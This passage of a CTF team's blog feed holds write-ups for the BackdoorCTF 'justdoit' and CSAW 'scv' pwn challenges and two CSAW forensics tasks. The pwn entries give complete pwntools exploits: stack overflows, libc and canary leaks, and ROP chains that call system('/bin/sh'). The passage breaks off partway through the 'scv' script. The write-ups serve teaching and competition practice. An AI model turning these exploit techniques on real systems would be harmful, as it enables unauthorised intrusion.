<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">binary = ELF(<span class="string">'./justdoit'</span>)</div><div class="line">libc = ELF(<span class="string">'libc.so.6'</span>)</div><div class="line">padding = <span class="string">'A'</span>*<span class="number">112</span></div><div class="line">WRITEPLT = binary.plt[<span class="string">'write'</span>]</div><div class="line">PRINTFGOT = binary.got[<span class="string">'printf'</span>]</div><div class="line">MAIN = <span class="number">0x804847d</span> <span class="comment"># You can get this from radare2 for example</span></div></pre></td></tr></table></figure>
<p>Since the binary is 32 bits we don’t really need to <code>pop</code> stack address into specific registers like in 64 bit a simple <code>ropchain</code> to leak <code>printf</code> address can be built like this:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ropchain = <span class="string">''</span></div><div class="line">ropchain += p32(WRITEPLT) <span class="comment"># WRITE function "call"</span></div><div class="line">ropchain += p32(MAIN) <span class="comment"># RETURN TO MAIN</span></div><div class="line">ropchain += p32(<span class="number">0x1</span>) <span class="comment"># STDIN ARG[0]</span></div><div class="line">ropchain += p32(PRINTFGOT) <span class="comment"># PRINTF ADDRESS ARG[1]</span></div><div class="line">ropchain += p32(<span class="number">0x4</span>) <span class="comment"># BYTES TO READ ARG[2]</span></div></pre></td></tr></table></figure>
<p>After we send this to the server, we can calculate everything with <code>symbols</code> from <code>pwntools</code> : </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">r = getConn()</div><div class="line"></div><div class="line">r.recvline()</div><div class="line">r.sendline(padding+ropchain)</div><div class="line">r.recv(len(padding)+len(ropchain)) <span class="comment"># reads the printf output</span></div><div class="line"></div><div class="line">PRINTF = u32(r.recv(<span class="number">0x4</span>)) <span class="comment"># leaked printf address</span></div><div class="line">LIBCBASE = PRINTF - libc.symbols[<span class="string">'printf'</span>]</div><div class="line">SYSTEM = LIBCBASE + libc.symbols[<span class="string">'system'</span>]</div><div class="line">BINSH = LIBCBASE + <span class="number">0x15900b</span></div><div class="line"></div><div class="line">log.info(<span class="string">"LIBC 0x%x"</span> % LIBCBASE)</div><div class="line">log.info(<span class="string">"PRINTF 0x%x"</span> % PRINTF)</div><div class="line">log.info(<span class="string">"SYSTEM 0x%x"</span> % SYSTEM)</div><div class="line">log.info(<span class="string">"Binsh 0x%x"</span> % BINSH)</div></pre></td></tr></table></figure>
<p>If you are wondering where I got the offset of <code>/bin/sh</code> string , you can use a nice trick with strings command:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ strings -a -t x libc.so.6 | grep <span class="string">'/bin/sh'</span></div><div class="line"> 15900b /bin/sh</div></pre></td></tr></table></figure>
<h3 id="Overflow-again-and-jump-to-libc"><a href="#Overflow-again-and-jump-to-libc" class="headerlink" title="Overflow again and jump to libc"></a>Overflow again and jump to libc</h3><p>Now that we have <code>system</code> and <code>/bin/sh</code> string we can just jump into them! note that I had to readjust the padding offset (use gdb to check the values on the <code>stack</code> to calculate the offset):</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">ropchain2 = p32(SYSTEM) <span class="comment"># WRITE function "call"</span></div><div class="line">ropchain2 += <span class="string">'BBBB'</span> <span class="comment"># Return address doesn't really matter to where we return after shell</span></div><div class="line">ropchain2 += p32(BINSH)</div><div class="line"></div><div class="line">r.recvuntil(<span class="string">'Hello pwners, \n'</span>)</div><div class="line">r.sendline(<span class="string">'A'</span>*(<span class="number">112</span><span class="number">-8</span>)+ropchain2)</div><div class="line">r.recv()</div><div class="line">r.interactive()</div><div class="line">r.close()</div></pre></td></tr></table></figure>
<p>And now the full script:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"></div><div class="line">local = <span class="keyword">True</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">return</span> process(<span class="string">'./justdoit'</span>, env = &#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">'./libc.so.6'</span>&#125;) <span class="keyword">if</span> local <span class="keyword">else</span> remote(<span class="string">'163.172.176.29'</span>, <span class="number">9036</span>)</div><div class="line"></div><div class="line">padding = <span class="string">'A'</span>*<span class="number">112</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">binary = ELF(<span class="string">'./justdoit'</span>)</div><div class="line">libc = ELF(<span class="string">'libc.so.6'</span>)</div><div class="line"></div><div class="line">WRITEPLT = binary.plt[<span class="string">'write'</span>]</div><div class="line">PRINTFGOT = binary.got[<span class="string">'printf'</span>]</div><div class="line">MAIN = <span class="number">0x804847d</span> <span class="comment"># You can get this from radare2 for example</span></div><div class="line"></div><div class="line">ropchain = <span class="string">''</span></div><div class="line">ropchain += p32(WRITEPLT) <span class="comment"># PRINTF function "call"</span></div><div class="line">ropchain += p32(MAIN) <span class="comment"># RETURN TO MAIN</span></div><div class="line">ropchain += p32(<span class="number">0x1</span>) <span class="comment"># STDIN ARG[0]</span></div><div class="line">ropchain += p32(PRINTFGOT) <span class="comment"># PRINTF ADDRESS ARG[1]</span></div><div class="line">ropchain += p32(<span class="number">0x4</span>) <span class="comment"># BYTES TO READ ARG[2]</span></div><div class="line"></div><div class="line">r = getConn()</div><div class="line"></div><div class="line"><span class="comment">#gdb.attach(r, '''</span></div><div class="line"><span class="comment">#	b *0x080484d8</span></div><div class="line"><span class="comment">#	c''')</span></div><div class="line"></div><div class="line">r.recvline()</div><div class="line">r.sendline(padding+ropchain)</div><div class="line">r.recv(len(padding)+len(ropchain)) <span class="comment"># reads the printf output</span></div><div class="line"></div><div class="line">PRINTF = u32(r.recv(<span class="number">0x4</span>))</div><div class="line">LIBCBASE = PRINTF - libc.symbols[<span class="string">'printf'</span>]</div><div class="line">SYSTEM = LIBCBASE + libc.symbols[<span class="string">'system'</span>]</div><div class="line">BINSH = LIBCBASE + <span class="number">0x15900b</span></div><div class="line"></div><div class="line">log.info(<span class="string">"LIBC 0x%x"</span> % LIBCBASE)</div><div class="line">log.info(<span class="string">"PRINTF 0x%x"</span> % PRINTF)</div><div class="line">log.info(<span class="string">"SYSTEM 0x%x"</span> % SYSTEM)</div><div class="line">log.info(<span class="string">"Binsh 0x%x"</span> % BINSH)</div><div class="line"></div><div class="line">ropchain2 = p32(SYSTEM) <span class="comment"># WRITE function "call"</span></div><div class="line">ropchain2 += <span class="string">'BBBB'</span> <span class="comment"># Return address doesn't really matter to where we return after shell</span></div><div class="line">ropchain2 += p32(BINSH)</div><div class="line"></div><div class="line">r.recvuntil(<span class="string">'Hello pwners, \n'</span>)</div><div class="line">r.sendline(<span class="string">'A'</span>*(<span class="number">112</span><span class="number">-8</span>)+ropchain2)</div><div class="line">r.recv()</div><div class="line">r.interactive()</div><div class="line">r.close()</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a data-fancybox=&quot;gallery&quot; href=&quot;https://i.imgur.com/zgcdKZK.png&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;br&gt;&lt;img src=&quot;https://i.imgur.com/zgcdKZ
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
    
      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
    
      <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
    
      <category term="ROP" scheme="https://teamrocketist.github.io/tags/ROP/"/>
    
      <category term="retToLibc" scheme="https://teamrocketist.github.io/tags/retToLibc/"/>
    
      <category term="backdoorctf" scheme="https://teamrocketist.github.io/tags/backdoorctf/"/>
    
  </entry>
  
  <entry>
    <title>[Forensics] CSAW - Missed Registration</title>
    <link href="https://teamrocketist.github.io/2017/09/19/Forensics-CSAW-Missed-Registration/"/>
    <id>https://teamrocketist.github.io/2017/09/19/Forensics-CSAW-Missed-Registration/</id>
    <published>2017-09-19T09:34:16.000Z</published>
    <updated>2017-09-19T10:49:04.383Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Missed Registration<br><br>It’s registration day! These forms just seem longer and longer…<br><br>UPDATE 10:44 Eastern: New pcap that should be a bit easier to work with.<br><br>UPDATE 2:58 Eastern: We’re regenerating due to flag leaks, submissions disabled until then. Please be patient.<br><br>Update 3:31 Eastern: Updated pcap with new flag after leak. Please re-run your solutions on the file!<br><br><a href="https://ctf.csaw.io/files/bd2d3bcfdf09f06728d81d1a0cc0e4ff/cap.pcap" target="_blank" rel="external">https://ctf.csaw.io/files/bd2d3bcfdf09f06728d81d1a0cc0e4ff/cap.pcap</a><br></blockquote>

<p>We have a pcap file, at first we saw alot of <code>HTTP POST</code> requests:</p>
<p><a data-fancybox="gallery" href="https://i.imgur.com/O2U2weX.png" target="_blank" rel="external"><img src="https://i.imgur.com/O2U2weX.png" alt=""></a></p>
<p>A lot of the form fields were filled with crap information in latin, at first we thought the parameter n was encrypted or some other kind of binary we extracted but we found nothing. After awhile instead of looking at HTTP form URL encoded tab from writeshark we started looking at TCP segment data and we found a new post param, a “x” parameter that only showed up in some of the requests:<br><a data-fancybox="gallery" href="https://i.imgur.com/jEzYqZz.png" target="_blank" rel="external"><img src="https://i.imgur.com/jEzYqZz.png" alt=""></a></p>
<p>The very first HTTP POST requests has this value:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&amp;x=424d923500000000000036040000280000004301000027000000010008000000000000000000c40e0000c40e00000001000000010000000001ff0c0e10ff0d1012ff131719ff161d21ff1b2226ff1c2b33ff1f313bff24292bff252c31ff2a3338ff33393bff243742ff283741ff</div></pre></td></tr></table></figure>
<p>the beginning of this value “424d” indicated us that this might be an bmp image file! so we extracted all x’s values in one line bash command!:</p>
<figure class="highlight zsh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tshark -r cap.pcap -Y <span class="string">"http &amp;&amp; tcp.payload contains \"&amp;x=\""</span> -Tfields -e tcp.segment_data | tr -d <span class="string">':|\n'</span> | xxd -r -p | tr -d <span class="string">'x='</span> | xxd -r -p &gt; img.bmp</div></pre></td></tr></table></figure>
<p><a data-fancybox="gallery" href="https://i.imgur.com/Kr6Kxhh.png" target="_blank" rel="external"><img src="https://i.imgur.com/Kr6Kxhh.png" alt=""></a></p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;Missed Registration&lt;br&gt;&lt;br&gt;It’s registration day! These forms just seem longer and longer…&lt;br&gt;&lt;br&gt;UPDATE 10:44 Eastern: New 
    
    </summary>
    
      <category term="Forensics" scheme="https://teamrocketist.github.io/categories/Forensics/"/>
    
    
      <category term="csaw" scheme="https://teamrocketist.github.io/tags/csaw/"/>
    
      <category term="forensics" scheme="https://teamrocketist.github.io/tags/forensics/"/>
    
      <category term="pcap" scheme="https://teamrocketist.github.io/tags/pcap/"/>
    
      <category term="bmp" scheme="https://teamrocketist.github.io/tags/bmp/"/>
    
  </entry>
  
  <entry>
    <title>[Forensics] CSAW - Best Router</title>
    <link href="https://teamrocketist.github.io/2017/09/19/Forensics-CSAW-Best-Router/"/>
    <id>https://teamrocketist.github.io/2017/09/19/Forensics-CSAW-Best-Router/</id>
    <published>2017-09-19T09:34:16.000Z</published>
    <updated>2017-09-26T19:18:07.658Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>    Best Router<br>    <a href="http://forensics.chal.csaw.io:3287" target="_blank" rel="external">http://forensics.chal.csaw.io:3287</a><br>    NOTE: This will expand to ~16GB!<br>    19:00 Eastern: updated. Old flags have been removed.<br></blockquote>

<p>Forensics challenge we have an img with 16GB, and an online service at <a href="http://forensics.chal.csaw.io:3287" target="_blank" rel="external">http://forensics.chal.csaw.io:3287</a>, the service asks for a username and a password so we guessed we need to find them in the img, so lets use autopsy to search in the linux filesystem for filenames that contain the word flag:<br><a data-fancybox="gallery" href="https://i.imgur.com/WBkVL6L.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/WBkVL6L.png" alt=""><br></a></p>
<p>As we can see we can found a <code>/var/www/flag.txt</code> unfortunately the file is empty, but we have the files of the web service of the link provided!<br><a data-fancybox="gallery" href="https://i.imgur.com/21qqjhh.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/21qqjhh.png" alt=""><br></a></p>
<p>Checking the username.txt and password.txt we can see that we have the username and password!<br><a data-fancybox="gallery" href="https://i.imgur.com/xCDzRDG.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/xCDzRDG.png" alt=""><br></a><br><a data-fancybox="gallery" href="https://i.imgur.com/ur0yCl6.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/ur0yCl6.png" alt=""><br></a></p>
<p>After using the credentials on the web page we got the flag!<br><a data-fancybox="gallery" href="https://i.imgur.com/b46URKw.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/b46URKw.png" alt=""><br></a></p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;    Best Router&lt;br&gt;    &lt;a href=&quot;http://forensics.chal.csaw.io:3287&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://forensics.chal.csa
    
    </summary>
    
      <category term="Forensics" scheme="https://teamrocketist.github.io/categories/Forensics/"/>
    
    
      <category term="csaw" scheme="https://teamrocketist.github.io/tags/csaw/"/>
    
      <category term="forensics" scheme="https://teamrocketist.github.io/tags/forensics/"/>
    
      <category term="partitions" scheme="https://teamrocketist.github.io/tags/partitions/"/>
    
      <category term="disk" scheme="https://teamrocketist.github.io/tags/disk/"/>
    
      <category term="autopsy" scheme="https://teamrocketist.github.io/tags/autopsy/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] CSAW - scv</title>
    <link href="https://teamrocketist.github.io/2017/09/18/Pwn-CSAW-scv/"/>
    <id>https://teamrocketist.github.io/2017/09/18/Pwn-CSAW-scv/</id>
    <published>2017-09-18T20:59:25.000Z</published>
    <updated>2017-10-05T03:00:21.484Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>SCV<br><br>SCV is too hungry to mine the minerals. Can you give him some food?<br><br>nc pwn.chal.csaw.io 3764<br><br></blockquote>

<h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>The binary is pretty simple to read we have 3 options, option 1 is to feed the SCV which is just filling a buffer with string from <code>stdin</code>, option 2 prints the string using <code>puts</code> so no format string vulnerability possible here, option 3 is to exit the program.</p>
<p>Pretty simple but where is the vulnerability? We can see the number of bytes in the parameters of <code>read</code> function is bigger than what the buffer can handle so we have a buffer overflow vulnerability but the real problem is how are we going to bypass this protections?:</p>
<p><a data-fancybox="gallery" href="https://i.imgur.com/Ol6bY6D.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/Ol6bY6D.png" alt=""><br></a></p>
<p>NX is enabled so the stack is not executable! we can bypass this easily using return-oriented-programming(ROP), but<br>another stack protection is enabled too which is the <strong>stack canary</strong>, we need to find away to leak addresses from the stack! but how do we do this?</p>
<p><a data-fancybox="gallery" href="https://i.imgur.com/kjykann.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/kjykann.png" alt=""><br></a></p>
<p>As we can see above the <code>read</code> function is reading the buf from STDIN, and what can we know about <code>read</code>? This function <strong>doesn’t put a null byte</strong> at the end of the read string, this awesome ! and why? because latter with option 2 <code>puts</code> will print the string until it finds a <em>null byte</em>, we can use this to our advantage to <strong>leak addresses</strong> from libc from the <strong>stack</strong> and even the <strong>stack canary</strong> itself! We just need to use gdb and look up the memory!</p>
<p>The plan is pretty simple:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1 - Leak libc addresses and stack canary</div><div class="line">2 - Overflow the buffer and return to libc</div></pre></td></tr></table></figure>
<h3 id="Leak-libc-addresses-and-stack-canary"><a href="#Leak-libc-addresses-and-stack-canary" class="headerlink" title="Leak libc addresses and stack canary"></a>Leak libc addresses and stack canary</h3><p>Lets do some debugging with gdb lets put a break point right before the read occurs and check the values of the buffer before being filled:</p>
<p><a data-fancybox="gallery" href="https://i.imgur.com/pKfMLAJ.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/pKfMLAJ.png" alt=""><br></a></p>
<p>As we can see there is a libc address in stack <code>0x00007f2cea4aabe9</code> we can count it easily how much we need to fill the buffer to print that address! and we need 40 bytes.<br>Writing the code to do this is very simple can be built in a function like this:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">readAddressFromTheStack</span><span class="params">(size, bytes_to_read, offset=<span class="number">0</span>)</span>:</span></div><div class="line">	<span class="string">"""</span></div><div class="line"><span class="string">    Args:</span></div><div class="line"><span class="string">        size (int): number of characters to send to the stack.</span></div><div class="line"><span class="string">        bytes_to_read (int): number of bytes to read from the stack we want to leak.</span></div><div class="line"><span class="string">		offset (int): number to subtract if we want to adjust the leaked address. (Optional)</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">    Returns:</span></div><div class="line"><span class="string">        int: returns an address leaked from the stack.</span></div><div class="line"><span class="string">	"""</span></div><div class="line">	</div><div class="line">	<span class="comment"># Write a certain number of bytes to leak an address</span></div><div class="line">	r.recvuntil(<span class="string">'&gt;&gt;'</span>)</div><div class="line">	r.sendline(<span class="string">'1'</span>)</div><div class="line">	r.recvuntil(<span class="string">'&gt;&gt;'</span>)</div><div class="line">	r.sendline(<span class="string">'A'</span>*size)</div><div class="line"></div><div class="line">	<span class="comment"># Read it from the stack</span></div><div class="line">	<span class="keyword">print</span> r.recvuntil(<span class="string">'&gt;&gt;'</span>)</div><div class="line">	r.sendline(<span class="string">'2'</span>)</div><div class="line">	r.recvuntil(<span class="string">'[*]PLEASE TREAT HIM WELL.....'</span>)</div><div class="line">	r.recvline()</div><div class="line">	r.recvline()</div><div class="line">	r.recv(size)</div><div class="line">	<span class="keyword">return</span> u64(r.recv(bytes_to_read).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))-offset</div></pre></td></tr></table></figure>
<p>So what to do with this address? we can calculate its offset to <code>system</code> for example! we can get the system address to calculate the offset and subtract the both values:</p>
<p><a data-fancybox="gallery" href="https://i.imgur.com/DTsmBOe.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/DTsmBOe.png" alt=""><br></a></p>
<p>Implementing this in python would be like this:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Get a libc address from the stack</span></div><div class="line">LEAKED = readAddressFromTheStack(<span class="number">40</span>, <span class="number">6</span>, <span class="number">-0x8f</span>)</div><div class="line">SYSTEM = LEAKED + <span class="number">0xb0f7</span></div><div class="line">LIBCBASE = SYSTEM -libc.symbols[<span class="string">'system'</span>]</div><div class="line">BINSH_OFFSET = <span class="number">0x18cd17</span> <span class="comment"># strings -a -t x libc-2.23.so | grep '/bin/sh'</span></div><div class="line">BINSH = LIBCBASE + BINSH_OFFSET</div><div class="line"></div><div class="line">log.info(<span class="string">"LEAKED LIBC 0x%x"</span> % LEAKED)</div><div class="line">log.info(<span class="string">"SYSTEM LIBC 0x%x"</span> % SYSTEM)</div><div class="line">log.info(<span class="string">"LIBCBASE LIBC 0x%x"</span> % LIBCBASE)</div><div class="line">log.info(<span class="string">"BINSH ADDRESS 0x%x"</span> % BINSH)</div></pre></td></tr></table></figure>
<p>The 3rd argument of <code>readAddressFromTheStack</code> is adjusting the address because in the <code>read</code> we are reading 40 bytes plus the new line character ‘\n’ because to send to the server we need to press enter, I could actually instead of sending 40 bytes in the padding we could just send 39 and the number would be right but I got lazy during the CTF so instead of fixing that I just readjust the address, the leaked address will always be overwritten with <code>0x0a</code> which is ‘\n’ Ascii code representation, so as I said before it needs some adjusting.</p>
<h4 id="Stack-canary"><a href="#Stack-canary" class="headerlink" title="Stack canary"></a>Stack canary</h4><p>Now that we have everything we need for libc we just need to get the stack canary address! to check where its being stored we can look at the very beginning of the main function</p>
<p><a data-fancybox="gallery" href="https://i.imgur.com/2L4LYMj.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/2L4LYMj.png" alt=""><br></a></p>
<p>From radare2 we can check it is being stored at local_8h which is a friendly name to be more readable in reality thinking it in assembly it’s stored in RBP-0x8 where RBP is the baseframe pointer.  </p>
<p>So lets check again in gdb, put a break point right before the <code>read</code> function and print the RBP-0x8 to see the stack canary value:</p>
<p><a data-fancybox="gallery" href="https://i.imgur.com/XHHEnfr.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/XHHEnfr.png" alt=""><br></a></p>
<p>Here is the code to get the stack canary from the stack:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># leak STACK CANARY</span></div><div class="line">STACK_CANARY = readAddressFromTheStack(<span class="number">40</span>+<span class="number">8</span>*<span class="number">16</span>, <span class="number">8</span>, <span class="number">0x0A</span>)</div><div class="line">log.info(<span class="string">"STACK CANARY 0x%x"</span> % STACK_CANARY)</div></pre></td></tr></table></figure>
<h4 id="Overflow-the-buffer-and-return-to-libc"><a href="#Overflow-the-buffer-and-return-to-libc" class="headerlink" title="Overflow the buffer and return to libc"></a>Overflow the buffer and return to libc</h4><p>We already have everything we need we just need to jump to libc rewrite the stack canary where it should be and remember we can’t forget to choose option 3 to exit the program, otherwise we never execute the <code>ret</code> assembly instruction and jump to <code>system(&quot;/bin/sh&quot;);</code>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div><div class="line">ROPCHAIN = <span class="string">''</span></div><div class="line">ROPCHAIN += p64(POPRET)</div><div class="line">ROPCHAIN += p64(BINSH)</div><div class="line">ROPCHAIN += p64(SYSTEM)</div><div class="line"></div><div class="line">padding3 = <span class="string">'A'</span>*(<span class="number">40</span>+<span class="number">8</span>*<span class="number">16</span>)+p64(STACK_CANARY)+ <span class="string">'AAAAAAAA'</span> + ROPCHAIN</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#rewrite old addresses</span></div><div class="line">r.recvuntil(<span class="string">'&gt;&gt;'</span>)</div><div class="line">r.sendline(<span class="string">'1'</span>)</div><div class="line">r.recvuntil(<span class="string">'&gt;&gt;'</span>)</div><div class="line">r.sendline(padding3)</div><div class="line"></div><div class="line"><span class="comment"># exiting</span></div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'&gt;&gt;'</span>)</div><div class="line">r.sendline(<span class="string">'3'</span>)</div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'[*]BYE ~ TIME TO MINE MIENRALS...'</span>)</div><div class="line">r.interactive()</div><div class="line"><span class="comment">#time.sleep(10)</span></div><div class="line">r.close()</div></pre></td></tr></table></figure>
<p>The full exploit:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> time</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> process(<span class="string">'./scv'</span>, env = &#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">'./libc-2.23.so'</span>&#125;) <span class="keyword">if</span> local <span class="keyword">else</span> remote(<span class="string">'pwn.chal.csaw.io'</span>, <span class="number">3764</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">readAddressFromTheStack</span><span class="params">(size, bytes_to_read, offset=<span class="number">0</span>)</span>:</span></div><div class="line">	<span class="string">"""</span></div><div class="line"><span class="string">    Args:</span></div><div class="line"><span class="string">        size (int): number of characters to send to the stack.</span></div><div class="line"><span class="string">        bytes_to_read (int): number of bytes to read from the stack we want to leak.</span></div><div class="line"><span class="string">		offset (int): number to subtract if we want to adjust the leaked address. (Optional)</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">    Returns:</span></div><div class="line"><span class="string">        int: returns an address leaked from the stack.</span></div><div class="line"><span class="string">	"""</span></div><div class="line">	</div><div class="line">	<span class="comment"># Write a certain number of bytes to leak LIBC</span></div><div class="line">	r.recvuntil(<span class="string">'&gt;&gt;'</span>)</div><div class="line">	r.sendline(<span class="string">'1'</span>)</div><div class="line">	r.recvuntil(<span class="string">'&gt;&gt;'</span>)</div><div class="line">	r.sendline(<span class="string">'A'</span>*size)</div><div class="line"></div><div class="line">	<span class="comment"># Read from the stack</span></div><div class="line">	<span class="keyword">print</span> r.recvuntil(<span class="string">'&gt;&gt;'</span>)</div><div class="line">	r.sendline(<span class="string">'2'</span>)</div><div class="line">	r.recvuntil(<span class="string">'[*]PLEASE TREAT HIM WELL.....'</span>)</div><div class="line">	r.recvline()</div><div class="line">	r.recvline()</div><div class="line">	r.recv(size)</div><div class="line">	<span class="keyword">return</span> u64(r.recv(bytes_to_read).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))-offset</div><div class="line">	</div><div class="line"> </div><div class="line">local = <span class="keyword">False</span></div><div 